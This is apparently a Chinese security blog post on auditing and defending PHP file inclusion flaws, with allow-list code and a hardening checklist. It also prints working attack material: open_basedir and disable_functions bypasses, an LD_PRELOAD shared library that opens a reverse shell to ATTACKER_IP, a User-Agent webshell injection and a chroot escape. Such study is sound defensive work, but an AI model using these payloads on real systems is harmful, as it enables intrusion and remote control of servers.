---
title: 文件包含漏洞：防御与代码审计
date: 2025-10-01 08:00:00
tags:
  - Web安全
  - 代码审计
  - 方法论
  - 渗透测试
description: 文件包含漏洞防御——allow list 策略、危险封装器禁用与 open_basedir 绕过。
categories: 渗透测试
---

## 引言

文件包含漏洞（File Inclusion Vulnerability）是 Web 安全中最具破坏性的漏洞之一。从源码泄露到远程代码执行（RCE），攻击者通过利用不安全的文件包含逻辑逐层突破，最终拿到系统控制权。本文从代码审计视角出发，系统梳理 PHP 环境下文件包含漏洞的挖掘方法、防御策略与多种绕过技巧。

## 一、代码审计：定位文件包含点

在 PHP 代码审计中，应建立对核心函数的"条件反射"——看到它们立即追踪参数来源。

### 1.1 核心危险函数

| 函数 | 风险说明 |
|------|----------|
| `include()` / `include_once()` | 包含并执行文件，文件不存在时仅 E_WARNING，脚本继续执行 |
| `require()` / `require_once()` | 包含并执行文件，文件不存在时 E_COMPILE_ERROR，脚本终止 |
| `file_get_contents()` | 读取文件内容为字符串。若结果传入 `eval()` 或写入可解析文件，则升级为代码执行 |
| `fopen()` / `file()` / `readfile()` | 读取任意文件，配合 `allow_url_fopen` 可实现 SSRF |
| `show_source()` / `highlight_file()` | 语法高亮显示源码，直接泄露敏感文件 |
| `simplexml_load_file()` / `DOMDocument::load()` | XXE 场景下可读取文件或配合 `expect://` 实现 RCE |
| `fread()` / `fgets()` | 在已打开句柄前提下读取内容，配合目录穿越泄露信息 |

### 1.2 三种典型审计模式

**模式一：直接输入拼接**

```php
// 无过滤直接包含
$page = $_GET['page'];
include($page . '.php');

// 路径穿越
$template = $_GET['template'];
include('/var/www/templates/' . $template);
// Payload: ../../../../etc/passwd%00 (PHP < 5.3.4)
```

**模式二：间接输入**

```php
$row = $db->query("SELECT template FROM pages WHERE id=" . $_GET['id']);
include($row['template']);
```

**模式三：二次利用（日志/Session 投毒）**

```php
$ua = $_SERVER['HTTP_USER_AGENT'];  // 攻击者可控
file_put_contents('/var/log/app.log', $ua, FILE_APPEND);
// 后续由另一处 LFI 包含此日志文件 → 代码执行
```

**Audit Grep 参考：**

```bash
grep -rn "include\|include_once\|require\|require_once" --include="*.php" .
grep -rn "file_get_contents\|fopen\|file\|readfile\|show_source" --include="*.php" .
grep -rn "include.*\$_\|require.*\$_" --include="*.php" .
```

## 二、防御策略

### 2.1 白名单（Allow List）— 最彻底的方案

将所有允许包含的文件路径预定义在映射表中，用户输入仅作为索引键：

```php
$allowed = [
    'home'    => '/var/www/app/views/home.php',
    'about'   => '/var/www/app/views/about.php',
    'contact' => '/var/www/app/views/contact.php',
];
$page = $_GET['page'] ?? 'home';
if (!array_key_exists($page, $allowed)) {
    http_response_code(404);
    die('Page not found');
}
include($allowed[$page]);
```

设计原则：键值映射、默认 fallback、拒绝即终止。

### 2.2 输入校验（次选方案）

当业务需要动态路径拼接时：

```php
$page = $_GET['page'];
if (!preg_match('/^[a-zA-Z0-9_-]+$/', $page)) {
    die('Invalid page name');
}
$file = '/var/www/app/views/' . $page . '.php';
$real = realpath($file);
if ($real === false || strpos($real, '/var/www/app/views/') !== 0) {
    die('Access denied');
}
include($real);
```

注意：`realpath()` 在文件不存在时返回 `false`，建议仅校验目录 `dirname(realpath($file))`。

### 2.3 禁用危险封装器（Wrapper）

```ini
; php.ini
allow_url_fopen = Off
allow_url_include = Off
```

| 封装器 | 风险 | 建议 |
|--------|------|------|
| `php://input` | 严重 — 直接代码执行 | 禁用 |
| `php://filter` | 高 — 源码泄露 | 按需禁用 |
| `data://` | 严重 — 内联代码执行 | 禁用 |
| `expect://` | 严重 — 系统命令执行 | 禁用 |
| `phar://` | 高 — 反序列化 RCE | 限制上传目录 |
| `zip://` | 中 — 压缩包内文件包含 | 限制上传目录 |

### 2.4 上传目录 PHP 引擎隔离

```apache
# Apache — 上传目录禁用 PHP
<Directory "/var/www/html/uploads">
    php_flag engine off
    RemoveHandler .php .phtml .php3 .php4 .php5 .php7 .php8
</Directory>
```

```nginx
# Nginx — 上传目录拒绝 PHP 处理
location /uploads/ {
    location ~ \.php$ { deny all; }
}
```

## 三、open_basedir 限制与绕过

`open_basedir` 是 PHP 提供的目录级沙箱，但它不是安全边界，存在多种绕过手段。

**方法一：命令执行直接绕过**

```php
system('cat /etc/passwd');     // 不受 open_basedir 约束
exec('ls -la /root');
shell_exec('cat /etc/shadow');
```

**方法二：MySQL LOAD_FILE 绕过**

```php
$conn = new mysqli('localhost', 'root', 'password');
$result = $conn->query("SELECT LOAD_FILE('/etc/passwd')");
// LOAD_FILE 在 MySQL 层面执行，不受 PHP open_basedir 限制
```

**方法三：FFI 扩展绕过（PHP 7.4+）**

```php
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system("cat /etc/passwd");
```

**方法四：glob:// 封装器绕过**

部分 PHP 版本中 `glob://` 可绕过 `open_basedir` 列举目录：

```php
foreach (glob('glob:///*') as $f) { echo $f . "\n"; }
```

**方法五：SplFileObject 迭代器绕过**

```php
foreach (new DirectoryIterator('/') as $f) { echo $f->getFilename() . "\n"; }
```

**核心结论：** `open_basedir` 对系统命令无效，仅能作为纵深防御的一环，不可依赖。

## 四、disable_functions 绕过与 LFI 组合利用

`disable_functions` 禁止危险函数，但配合 LFI 存在多种绕过路径。

**方法一：未禁用函数利用**

```php
pcntl_exec('/bin/bash', ['-c', 'id']);                          // PCNTL 扩展
putenv('LD_PRELOAD=/tmp/evil.so'); mail('','','','');            // LD_PRELOAD 劫持
imap_open('{x:993/imap/ssl}INBOX', '', '');                      // IMAP RCE
dl('evil.so');                                                    // PHP < 5.3 动态加载
```

**方法二：LD_PRELOAD + mail() 经典绕过**

利用 `mail()` / `error_log()` 内部调用 sendmail 时，通过 `putenv()` 注入环境变量劫持共享库：

```c
// evil.c → gcc -shared -fPIC evil.c -o evil.so
#include <stdlib.h>
#include <stdio.h>
uid_t getuid(void) {
    system("bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/4444 <&1'");
    return 0;
}
```

```php
putenv('LD_PRELOAD=/tmp/evil.so');
mail('a', 'b', 'c', 'd');   // 触发 sendmail → 加载 evil.so → 反弹 shell
```

**方法三：LFI + PHP 临时文件竞态**

Apache+PHP 环境下，利用 multipart 上传时创建的 `/tmp/phpXXXXXX` 临时文件与 LFI 竞态包含实现 RCE。配合 `phpinfo()` 泄露临时文件路径可显著提高成功率。

**方法四：PHP 内部 UAF / GC 漏洞**

现代 PHP 版本的绕过通常依赖 Use-After-Free 或 GC 缺陷（如 PHP 7.x `backtrace` UAF、PHP 8.x `array_walk` + GC），需要编写 PHP 扩展形式的 Exploit 并由 LFI 加载。

## 五、PHP chroot Jail 与逃逸

PHP 的 `chroot()` 不是真正的安全隔离，在 root 权限下可逃逸。

**经典 chroot 逃逸：**

```php
chroot('/var/jail');        // 限制根目录到 /var/jail
mkdir('tmpdir');            // 在 jail 内创建子目录
chroot('tmpdir');           // 将根目录改为 /var/jail/tmpdir
chdir('../../../../../../'); // 利用 cwd 向上逃逸出 jail
chroot('.');                // 在真实根目录下再次 chroot
system('id');               // 成功逃逸
```

**利用 /proc 文件系统：**

```bash
cat /proc/1/cmdline          # 读取 init 进程命令行
cat /proc/1/environ          # 读取环境变量
cat /proc/self/maps          # 读取进程内存映射
```

**LFI 在 chroot 环境下的利用价值：** 读取 chroot 内所有配置文件、日志投毒、session 投毒、通过 /proc 泄露进程信息。

## 六、攻击链示例

一条实战 LFI-to-RCE 链条：

```
LFI 发现 → php://filter 读源码 → 日志路径确认
→ User-Agent 注入 <?php system($_GET['cmd']);?>
→ 包含日志文件执行命令 → disable_functions 限制
→ 上传 evil.so → LD_PRELOAD 绕过 → 反弹 shell
→ open_basedir 限制 → 命令执行直接读取（不受约束）→ 提权
```

## 七、代码审计检查清单

| 编号 | 检查项 | 检查方法 | 风险 |
|------|--------|----------|------|
| 1 | include/require 参数是否来自用户输入 | 追踪 $_GET/POST/COOKIE/SERVER/FILES 到包含函数 | 严重 |
| 2 | file_get_contents 路径是否可控 | 检查 URL/路径参数来源 | 高 |
| 3 | 是否存在白名单机制 | 确认 array_key_exists 或 switch-case 映射 | — |
| 4 | 路径拼接前是否经过严格正则过滤 | 检查是否漏掉 ../、..\、URL 编码绕过 | 高 |
| 5 | 是否存在后缀自动追加及其截断可能 | 检查空字节(%00)、路径截断、? 绕过后缀 | 中 |
| 6 | allow_url_include 是否为 On | php.ini 或 ini_get 检查 | 严重 |
| 7 | allow_url_fopen 是否为 On | php.ini 检查 | 高 |
| 8 | 是否禁用危险封装器 | 检查 stream_wrapper_unregister 调用 | 中 |
| 9 | realpath/basename 防御是否到位 | 确认解析后校验目录前缀 | 高 |
| 10 | open_basedir 是否配置（纵深防御） | php.ini 检查，但需知命令执行可绕过 | 低 |
| 11 | disable_functions 是否有遗漏 | 检查 pcntl_exec、mail+putenv、FFI 等 | 高 |
| 12 | 上传目录是否禁用 PHP 引擎 | .htaccess 或 Nginx location deny | 高 |
| 13 | 日志文件路径是否可预测 | Apache/Nginx 默认日志路径 | 中 |
| 14 | PHP Session 存储路径是否可预测 | session.save_path 配置 | 中 |
| 15 | 是否存在 FFI 扩展 | ffi.enable 配置 | 高 |
| 16 | 错误信息是否展示绝对路径 | display_errors 配置 | 中 |
| 17 | XXE + 文件包含组合是否可能 | libxml_disable_entity_loader 状态 | 中 |
| 18 | phar:// 封装器是否可用 | 配合文件上传，phar 反序列化 → RCE | 高 |

## 八、防御最佳实践

### 8.1 开发者清单

- 首选白名单映射，用户输入永不直接拼接到路径。
- 次选严格正则 `[a-zA-Z0-9_-]` + `realpath()` 校验目录前缀。
- `allow_url_include = Off`，无论任何场景。
- 禁用不必要封装器：`php://input`、`data://`、`expect://`。
- 上传目录独立存储（子域 / CDN 更佳），禁用 PHP 引擎。
- 日志脱敏：避免将用户输入原样写入日志，或做编码/截断。
- 最小权限运行 PHP-FPM，配合 `open_basedir`（增加攻击成本）。
- 生产环境关闭 `display_errors`，错误仅写日志文件。
- PHP 保持更新，许多绕过技巧依赖特定版本。

### 8.2 运维加固清单

- 容器化 / 虚拟化隔离：chroot 不是安全边界，Docker / KVM 才是。
- AppArmor / SELinux：为 PHP-FPM 编写 MAC 策略，限制文件访问。
- WAF 规则覆盖：检测 `../`、`..\`、`%00`、`php://`、`data://` 等特征。
- 日志监控告警：监控高危封装器访问与异常包含请求。
- 定期渗透测试：自动化扫描 + 人工审计相结合。

### 8.3 防御骨架代码

```php
function safe_include(string $name): void
{
    // 第1层：白名单
    $allowed = [
        'header'  => __DIR__ . '/templates/header.php',
        'footer'  => __DIR__ . '/templates/footer.php',
        'sidebar' => __DIR__ . '/templates/sidebar.php',
    ];
    if (!array_key_exists($name, $allowed)) {
        http_response_code(403);
        error_log("Illegal include attempt: " . $name);
        die('Access denied');
    }
    $file = $allowed[$name];

    // 第2层：检测危险协议
    if (preg_match('#^(php|data|expect|phar|zip)://#i', $file)) {
        die('Protocol not allowed');
    }

    // 第3层：文件必须存在
    if (!file_exists($file)) { die('Template not found'); }

    // 第4层：realpath 二次确认
    $real = realpath($file);
    $base = realpath(__DIR__ . '/templates/');
    if ($real === false || strpos($real, $base) !== 0) {
        die('Path traversal detected');
    }
    include $real;
}
```

## 九、免责声明

> **本文仅供安全研究与学习交流之用。** 文中涉及的技术、工具与方法严禁用于未授权的渗透测试和任何形式的非法入侵。因不当使用本文内容所造成的一切法律责任与后果由行为人自行承担。进行安全测试前，请确保已获得目标所有者的明确书面授权，并严格遵守《中华人民共和国网络安全法》及相关法律法规。

*参考资源：*
- [OWASP: File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing-for-Local-File-Inclusion)
- [PHP Manual: Filesystem Security](https://www.php.net/manual/en/security.filesystem.php)
- [PHP Manual: Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php)
- [HackTricks: File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
